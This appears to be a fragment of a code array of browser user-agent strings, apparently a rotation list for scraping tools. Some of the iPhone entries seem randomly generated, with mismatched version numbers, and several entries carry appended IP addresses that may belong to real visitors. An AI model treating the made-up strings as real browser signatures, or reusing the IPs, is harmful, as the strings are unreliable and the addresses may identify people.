    "Mozilla/5.0 (iPhone; CPU iPhone OS 8_5_3; like Mac OS X) AppleWebKit/603.9 (KHTML, like Gecko)  Chrome/52.0.2675.243 Mobile Safari/537.4",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_0; like Mac OS X) AppleWebKit/533.21 (KHTML, like Gecko)  Chrome/49.0.2976.257 Mobile Safari/536.4",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_4; like Mac OS X) AppleWebKit/602.33 (KHTML, like Gecko)  Chrome/47.0.2123.227 Mobile Safari/601.9",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 8_6_2; like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko)  Chrome/49.0.1127.362 Mobile Safari/535.4",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 7_7_3; like Mac OS X) AppleWebKit/603.24 (KHTML, like Gecko)  Chrome/53.0.2685.250 Mobile Safari/533.7",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 7_6_0; like Mac OS X) AppleWebKit/537.44 (KHTML, like Gecko)  Chrome/54.0.2644.162 Mobile Safari/600.4",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 11_3_7; like Mac OS X) AppleWebKit/600.29 (KHTML, like Gecko)  Chrome/55.0.3151.292 Mobile Safari/603.9",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 9_7_5; like Mac OS X) AppleWebKit/602.13 (KHTML, like Gecko)  Chrome/48.0.1416.217 Mobile Safari/536.5",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 8_3_1; like Mac OS X) AppleWebKit/533.49 (KHTML, like Gecko)  Chrome/53.0.3153.354 Mobile Safari/602.0",
    "Mozilla/5.0 (Linux; Android 6.0.1; SM-G532MT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; moto e(7) plus Build/QPZS30.30-Q3-38-69-9; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.127 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; JAT-L41) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.0 Mobile Safari/537.36",
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/217.0.454508427 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36 Edg/103.0.1264.37",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36 Edg/103.0.1264.37",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5115.170 Safari/537.36 Edg/101.0.1202.50",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.0 Safari/537.36 Edg/105.0.1296.0",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4881.178 Safari/537.36 Edg/98.0.1108.50",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5111.0 Safari/537.36 Edg/104.0.1290.0",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4881.196 Safari/537.36 Edg/95.0.1020.30",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36 Edg/98.0.1108.62",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.0 Safari/537.36 Edg/104.0.1293.1",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36 Edg/103.0.1264.32",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.0 Safari/537.36 Edg/104.0.1293.0",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36 Edg/102.0.1245.44",
"Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5098.136 Safari/537.36 Edg/99.0.1208.24",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.124 Safari/537.36 Edg/102.0.1245.71",
"Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:107.0) Gecko/20110101 Firefox/107.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4; rv:107.0) Gecko/20110101 Firefox/107.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_1; rv:106.0) Gecko/20000101 Firefox/106.0",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:106.0) Gecko/20012209 Firefox/106.0",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20110101 Firefox/100.0",
"Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:100.0) Gecko/20061419 Firefox/100.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 12.4; rv:100.0) Gecko/20100101 Firefox/100.0",
"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:100.0) Gecko/20000101 Firefox/100.0",
"Mozilla/5.0 (X11; Linux x86_64) Gecko/20162914 Firefox/100.0",
"Mozilla/5.0 (Macintosh; PPC Mac OS X x.y; rv:100.0) Gecko/20100101 Firefox/100.0",
"Mozilla/5.0 (Linux; Android 11; Mobile; rv: 100.0) Gecko/100.0 FireFox/100.0",
"Mozilla/5.0 (X11; U; Linux x86_64) Gecko/20000604 Firefox/100.0",
"Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:100.0) Gecko/20071101 Firefox/100.0",
"Mozilla/5.0 (X11; Linux x86_64:100.0) Gecko/20100101 Firefox/100.0",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:100.0) Gecko/20012119 Firefox/100.0",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.91 Safari/537.36 OPR/44.0.2276.288",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.4126.146 Safari/537.36 OPR/54.0.4177.46",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.4123.146 Safari/537.36 OPR/53.0.4054.46",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4892.119 Safari/537.36 OPR/85.0.4341.72",
"Mozilla/5.0 (Windows NT 10.0; Win64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5150.115 Safari/537.36 OPR/80.0.3637.162",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4870.168 Safari/537.36 OPR/78.0.3351.71",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36 OPR/85.0.4341.18",
"Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.5126.171 Safari/537.36 OPR/79.0.2378.171",
"Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5041.151 Safari/537.36 OPR/82.0.4117.142",
"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36 OPR/88.0.4412.40",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36 OPR/87.0.4390.58",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4930.0 Safari/537.36 OPR/83.0.4254.27",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/102.0.5005.61 Safari/537.36 OPR/88.0.4412.27",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4862.113 Safari/537.36 OPR/85.0.4341.60",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36 OPR/88.0.4412.40",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15 [ip:87.10.225.10]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1 [ip:193.207.163.73]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1 [ip:193.207.205.123]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1 [ip:193.207.182.120]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1 [ip:193.207.216.36]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1 [ip:193.207.209.127]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1 [ip:82.51.25.66]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1 [ip:193.207.183.139]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1 [ip:193.207.204.153]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1 [ip:193.207.211.83]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1 [ip:87.18.55.5]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1 [ip:87.6.61.173]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1 [ip:193.207.202.253]",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 12_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15",
"Mozilla/5.0 (iPad; CPU OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4.1 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML%2C like Gecko) Version/15.4 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15",
"Mozilla/5.0 (iPad; CPU OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML%2C like Gecko) Version/15.4 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (iPad; CPU OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15H321 Safari/604.1",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.41",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.8.26",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/605.1.15 BingSapphire/1.0.400518001",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4.1 Mobile/15E148 Safari/605.1.15 BingSapphire/1.0.400518001",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4.1 Mobile/15E148 Safari/605.1.15 BingSapphire/1.0.391216004",
"Mozilla/5.0 (iPad; CPU OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4.1 Mobile/15E148 Safari/605.1.15 BingSapphire/1.0.400511001",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/605.1.15",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 12_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_16) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15",
"Mozilla/5.0 (iPad; CPU OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4.1 Mobile/15E148 Safari/605.1.15 NewsSapphire/1.0.400420001",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4.1 Mobile/15E148 Safari/605.1.15 BingSapphire/1.0.400511001",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 GLS/93.10.1819.20",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.134 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36 OpenWave/96.4.1823.24",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5022.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5022.0 Safari/537.36",
"Mozilla/5.0 (X11; CrOS x86_64 14927.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; STK-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; M2003J15SC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; SM-S767VL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; SM-G986U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; KFMAWI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
"Mozilla/5.0 (X11; CrOS x86_64 14917.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5116.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5118.3 Safari/537.36",
"Mozilla/5.0 (X11; CrOS x86_64 14885.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5117.0 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5116.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5115.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5114.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5113.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5113.0 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5113.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.4896.127 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5022.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.4844.51 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.4844.51 Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G531H) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1.1; Redmi Note 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-A305G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-G930F/G930FXXU5ESD2) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.2; fr-fr; SAMSUNG SM-T520 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/1.5 Chrome/28.0.1500.94 Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) coc_coc_browser/82.0.140 Chrome/76.0.3809.140 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) coc_coc_browser/82.0.140 Chrome/76.0.3809.140 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18898",
"Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36",
"Mozilla/5.0 (X11; Linux i686 (x86_64)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.87 Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; KOB-L09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.1.0; SAMSUNG SM-G610M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36",
"Mozilla/5.0 (X11; CrOS armv7l 9592.82.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.101 Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.1.2; SM-G955N Build/N2G48H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-J120H) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.30729; .NET CLR 3.5.30729)",
"Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 DuckDuckGo/7",
"Mozilla/5.0 (X11; CrOS x86_64 10122.139.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3265.0 Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G900H) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C)",
"Mozilla/5.0 (Linux; Android 5.0.2; Lenovo K920 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.93 Mobile Safari/537.36",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; GTB7.5; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E)",
"Mozilla/5.0 (Linux; Android 9; SM-J720F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.2; LG-V500 Build/KOT49I.V50020f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.135 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36 OPR/44.0.2510.1159",
"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36 OPR/58.0.3135.90",
"Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.2.2; SM-T111 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.85 Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; IF9007 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.116 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; SM-J330G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.89 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; SM-A405FM Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.103 YaBrowser/18.7.1.595.00 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-J610F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 YaBrowser/19.4.5.141.00 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1.1; SM-G530T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1; Lenovo A2010-a Build/LMY47D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-J600FN) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1; HUAWEI LUA-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; SM-A305FN Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36 OPR/53.1.2569.142848",
"Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-N935F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1.1; Lenovo A6020a46) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; LLD-AL10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0.1; SM-G928T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36",
"Mozilla/5.0 (iPod touch; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (Linux; Android 4.2.2; GSmart Roma R2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.0.1; LG-H324) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.2; GT-I9301I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.89 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-J500FN Build/LMY48B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/8.2 Chrome/63.0.3239.111 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; SM-A510F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36 OPR/53.1.2569.142848",
"Mozilla/5.0 (Linux; Android 9; vivo 1806) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36",
